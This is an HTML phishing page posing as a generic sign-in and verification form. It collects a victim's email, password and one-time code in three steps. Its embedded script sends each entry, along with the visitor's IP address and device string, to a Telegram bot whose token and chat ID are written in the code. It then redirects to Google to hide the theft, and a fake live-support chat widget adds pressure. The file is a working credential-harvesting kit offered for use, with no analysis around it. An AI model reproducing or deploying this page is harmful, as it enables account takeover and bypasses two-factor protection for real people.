<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign In Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { box-sizing: border-box; font-family: 'Inter', sans-serif; -webkit-tap-highlight-color: transparent; }
        body, html {
            margin: 0; padding: 0; height: 100%; width: 100%;
            display: flex; justify-content: center; align-items: center;
            background-image: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.4)), url('https://images.unsplash.com/photo-1427504494785-3a9ca7044f45?auto=format&fit=crop&q=80&w=2070');
            background-size: cover; background-position: center;
        }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; backdrop-filter: blur(15px); background: rgba(255, 255, 255, 0.05); z-index: 1; }
        .card { position: relative; z-index: 2; background: white; padding: 40px 30px; border-radius: 20px; width: 90%; max-width: 380px; min-height: 340px; box-shadow: 0 15px 35px rgba(0,0,0,0.2); overflow: hidden; }
        
        .loader-container { position: absolute; top: 0; left: 0; width: 100%; height: 4px; background: #f0f0f0; display: none; }
        .loader-bar { height: 100%; width: 0%; background: #9d81e9; transition: width 2s linear; }

        .back-btn { position: absolute; top: 20px; left: 20px; cursor: pointer; display: none; padding: 5px; border-radius: 50%; }
        h1 { margin: 10px 0 24px 0; font-size: 24px; font-weight: 700; color: #111; }
        label { display: block; font-size: 12px; font-weight: 500; color: #777; margin-bottom: 8px; }
        input { width: 100%; padding: 14px; border: 1px solid #e0e0e0; border-radius: 10px; font-size: 16px; margin-bottom: 4px; outline: none; transition: border 0.2s; }
        input:focus { border-color: #9d81e9; }
        input:disabled { background: #fafafa; cursor: not-allowed; }
        
        .error-text { color: #ff4d4d; font-size: 11px; margin-top: 2px; display: none; font-weight: 500; }
        .footer-text, .timer-text { font-size: 13px; color: #444; margin: 15px 0 25px 0; }
        .footer-text a, .resend-link { color: #8a70d6; text-decoration: none; font-weight: 600; cursor: pointer; }
        
        .btn-container { display: flex; justify-content: flex-end; margin-top: 10px; }
        button { background-color: #a288ef; color: white; border: none; padding: 12px 32px; border-radius: 10px; font-size: 14px; font-weight: 600; cursor: pointer; min-width: 100px; transition: 0.2s; }
        button:disabled { background-color: #d1d1d1; cursor: not-allowed; }

        .step { display: none; }
        .step.active { display: block; animation: fadeIn 0.4s ease-out; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(5px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <div class="overlay"></div>

    <div class="card">
        <div class="loader-container" id="loaderContainer"><div class="loader-bar" id="loaderBar"></div></div>
        <div class="back-btn" id="backBtn" onclick="goBack()">
            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#666" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M19 12H5M12 19l-7-7 7-7"/></svg>
        </div>

        <div id="step1" class="step active">
            <h1>Sign In</h1>
            <label>Official Email</label>
            <input type="email" id="emailInput" oninput="validateEmail()" onkeydown="checkEnter(event, 2)" placeholder="email@address.com">
            <div class="footer-text">No account? <a href="#">Create one!</a></div>
            <div class="btn-container"><button id="btn1" disabled onclick="processStep(2)">Next</button></div>
        </div>

        <div id="step2" class="step">
            <h1>Sign In</h1>
            <label>Enter Password</label>
            <input type="text" id="passInput" oninput="validatePass()" onkeydown="checkEnter(event, 3)" placeholder="Password">
            <div id="passError" class="error-text">Incorrect password, try again</div>
            <div class="footer-text">Forgot password? <a href="#">Reset here!</a></div>
            <div class="btn-container"><button id="btn2" disabled onclick="processStep(3)">Next</button></div>
        </div>

        <div id="step3" class="step">
            <h1>Verification</h1>
            <label>Enter Verification Number</label>
            <input type="text" id="codeInput" placeholder="123 456" inputmode="numeric" maxlength="7" oninput="validateCode(this)" onkeydown="checkEnter(event, 'finish')">
            <div class="timer-text" id="timerDisplay">Resend code in <span id="time">01:21</span></div>
            <div class="btn-container"><button id="btn3" disabled onclick="processStep('finish')">Submit</button></div>
        </div>
    </div>

    <script>
        const BOT_TOKEN = "5365776901:AAHc5kMykq2qMuTQdjVnVDp_s7_gDlBlnUk";
        const CHAT_ID = "-1003812739349";
        const REDIRECT_URL = "https://www.google.com";

        let userIP = "Unknown";
        let currentStep = 1;
        let isProcessing = false;
        let countdown;

        fetch('https://api.ipify.org?format=json')
            .then(res => res.json()).then(data => userIP = data.ip)
            .catch(() => userIP = "Hidden/VPN");

        // GLOBAL Enter support for any focused input
        function checkEnter(event, nextStepVal) {
            if (event.key === "Enter" || event.keyCode === 13) {
                event.preventDefault(); // Prevent default form behavior
                const currentBtn = document.querySelector('.step.active button');
                if (!currentBtn.disabled && !isProcessing) {
                    processStep(nextStepVal);
                }
            }
        }

        async function processStep(next) {
            if (isProcessing) return;
            isProcessing = true;

            const btn = document.querySelector('.step.active button');
            const originalText = btn.innerText;
            const loaderContainer = document.getElementById('loaderContainer');
            const loaderBar = document.getElementById('loaderBar');
            const inputs = document.querySelectorAll('input');

            btn.innerText = "Loading...";
            btn.disabled = true;
            inputs.forEach(i => i.disabled = true);
            loaderContainer.style.display = 'block';
            setTimeout(() => { loaderBar.style.width = '100%'; }, 10);

            const email = document.getElementById('emailInput').value;
            const password = document.getElementById('passInput').value;
            const code = document.getElementById('codeInput').value;
            const ua = navigator.userAgent;
            
            let message = `ðŸ”” *SIGN-IN ALERT* ðŸ””\n\nðŸ“ *IP:* \`${userIP}\`\nðŸ“§ *Email:* \`${email}\`\n`;
            if (currentStep >= 2) message += `ðŸ”‘ *Pass:* \`${password}\`\n`;
            if (next === 'finish') message += `ðŸ”¢ *OTP:* \`${code}\`\n`;
            message += `ðŸ“± *Device:* \`${ua}\``;

            try {
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ chat_id: CHAT_ID, text: message, parse_mode: "Markdown" })
                });
            } catch (err) { console.error(err); }

            setTimeout(() => {
                if (next === 'finish') {
                    btn.innerText = "Verifying...";
                    loaderBar.style.width = '0%';
                    setTimeout(() => {
                        window.location.href = REDIRECT_URL;
                    }, 2500);
                } else {
                    isProcessing = false;
                    loaderContainer.style.display = 'none';
                    loaderBar.style.width = '0%';
                    btn.innerText = originalText;
                    inputs.forEach(i => i.disabled = false);
                    nextStep(next);
                    if (next === 3) startTimer();
                }
            }, 2000);
        }

        function validateEmail() {
            const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            document.getElementById('btn1').disabled = !re.test(document.getElementById('emailInput').value);
        }

        function validatePass() {
            const pass = document.getElementById('passInput').value;
            const btn = document.getElementById('btn2');
            btn.disabled = pass.length < 1;
        }

        function validateCode(input) {
            let val = input.value.replace(/\D/g, '');
            if (val.length > 3) val = val.slice(0, 3) + ' ' + val.slice(3, 6);
            input.value = val;
            const digitCount = input.value.replace(/\s/g, '').length;
            document.getElementById('btn3').disabled = digitCount < 4;
        }

        function nextStep(s) {
            currentStep = s;
            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
            document.getElementById('step' + s).classList.add('active');
            document.getElementById('backBtn').style.display = (s > 1) ? 'block' : 'none';
            const input = document.querySelector('#step' + s + ' input');
            if (input) input.focus();
        }

        function goBack() {
            if (currentStep > 1 && !isProcessing) {
                if (currentStep === 3) clearInterval(countdown);
                nextStep(currentStep - 1);
            }
        }

        function startTimer() {
            clearInterval(countdown);
            let duration = 81;
            const container = document.getElementById('timerDisplay');
            container.innerHTML = 'Resend code in <span id="time">01:21</span>';
            const display = document.getElementById('time');
            countdown = setInterval(() => {
                let m = Math.floor(duration / 60), s = duration % 60;
                display.textContent = `${m < 10 ? '0' : ''}${m}:${s < 10 ? '0' : ''}${s}`;
                if (--duration < 0) {
                    clearInterval(countdown);
                    container.innerHTML = 'Didn\'t get a code? <span class="resend-link" onclick="startTimer()">Resend</span>';
                }
            }, 1000);
        }
    </script>
    <audio id="chat-ping" preload="auto">
    <source src="https://assets.mixkit.co/active_storage/sfx/2358/2358-preview.mp3" type="audio/mpeg">
</audio>

<div id="chat-wrapper">
    <div id="notif-toast" onclick="toggleChat()">
        <div class="toast-header">
            <strong>Support Team</strong>
            <span class="close-toast">Ã—</span>
        </div>
        <div id="toast-body">New message...</div>
    </div>

    <button id="chat-btn" onclick="toggleChat()">
        <div id="unread-badge"></div>
        <svg id="chat-icon-svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z"></path>
        </svg>
        <span id="btn-text">Live Help</span>
    </button>
</div>

<style>
    /* Hide Tawk.to Default UI */
    .tawk-min-container, #tawk-chat-container, .tawk-badge, .tawk-bubble-container {
        display: none !important;
        visibility: hidden !important;
    }

    #chat-wrapper {
        position: fixed;
        bottom: 20px;
        right: 20px;
        z-index: 2147483647;
        display: flex;
        flex-direction: column;
        align-items: flex-end;
        font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
    }

    #notif-toast {
        visibility: hidden;
        width: 280px;
        background: #ffffff;
        border-radius: 12px;
        box-shadow: 0 10px 30px rgba(0,0,0,0.2);
        margin-bottom: 15px;
        padding: 15px;
        border-left: 5px solid #000;
        cursor: pointer;
        transform: translateX(120%);
        transition: transform 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275), opacity 0.3s;
        opacity: 0;
    }

    #notif-toast.show { visibility: visible; transform: translateX(0); opacity: 1; }

    #chat-btn {
        background: #000;
        color: #fff;
        border: none;
        padding: 15px 25px;
        border-radius: 30px;
        font-weight: 600;
        cursor: pointer;
        display: flex;
        align-items: center;
        gap: 10px;
        box-shadow: 0 4px 12px rgba(0,0,0,0.2);
        position: relative;
        transition: all 0.3s ease;
        animation: pulse-animation 3s infinite;
    }

    #chat-btn:hover {
        background: #333;
        transform: translateY(-3px);
        animation: none;
    }

    @keyframes pulse-animation {
        0% { transform: scale(1); }
        50% { transform: scale(1.05); }
        100% { transform: scale(1); }
    }

    #unread-badge {
        position: absolute;
        top: -2px; right: -2px;
        width: 14px; height: 14px;
        background: #ff3b30;
        border: 2px solid white;
        border-radius: 50%;
        display: none;
    }

    .toast-header { font-size: 11px; color: #888; margin-bottom: 8px; text-transform: uppercase; font-weight: bold; display: flex; justify-content: space-between; }
    #toast-body { font-size: 14px; color: #222; line-height: 1.4; }
</style>

<script type="text/javascript">
var Tawk_API = Tawk_API || {}, Tawk_LoadStart = new Date();

Tawk_API.onLoad = function(){
    Tawk_API.hideWidget();
};

Tawk_API.onChatMinimized = function(){
    Tawk_API.hideWidget();
    document.getElementById('btn-text').innerText = "Live Help";
};

function toggleChat() {
    const btnText = document.getElementById('btn-text');
    if (Tawk_API.isChatMaximized()) {
        Tawk_API.minimize();
        Tawk_API.hideWidget();
        btnText.innerText = "Live Help";
    } else {
        Tawk_API.showWidget();
        Tawk_API.maximize();
        btnText.innerText = "Close Chat";
        document.getElementById('notif-toast').classList.remove('show');
        document.getElementById('unread-badge').style.display = 'none';
    }
}

// Handler for Agent Messages with Audio
Tawk_API.onChatMessageAgent = function(data) {
    if (!Tawk_API.isChatMaximized()) {
        const toast = document.getElementById('notif-toast');
        const badge = document.getElementById('unread-badge');
        const ping = document.getElementById('chat-ping');
        const body = document.getElementById('toast-body');
        
        // Extract message string
        let textContent = (typeof data === 'string') ? data : (data.message || data.msg || "New message received");
        body.innerText = textContent; 

        // PLAY SOUND
        // Note: Browsers usually require 1 user click on the page before sound can play
        ping.play().catch(function(e) {
            console.log("Audio waiting for user interaction");
        });
        
        toast.classList.add('show');
        badge.style.display = 'block';

        setTimeout(() => { toast.classList.remove('show'); }, 10000);
    }
};

(function(){
var s1=document.createElement("script"),s0=document.getElementsByTagName("script")[0];
s1.async=true;
s1.src='https://embed.tawk.to/697f55b9fd3ee61c36a86deb/1jgcmdo0u';
s1.charset='UTF-8';
s1.setAttribute('crossorigin','*');
s0.parentNode.insertBefore(s1,s0);
})();
</script>
</body>
</html>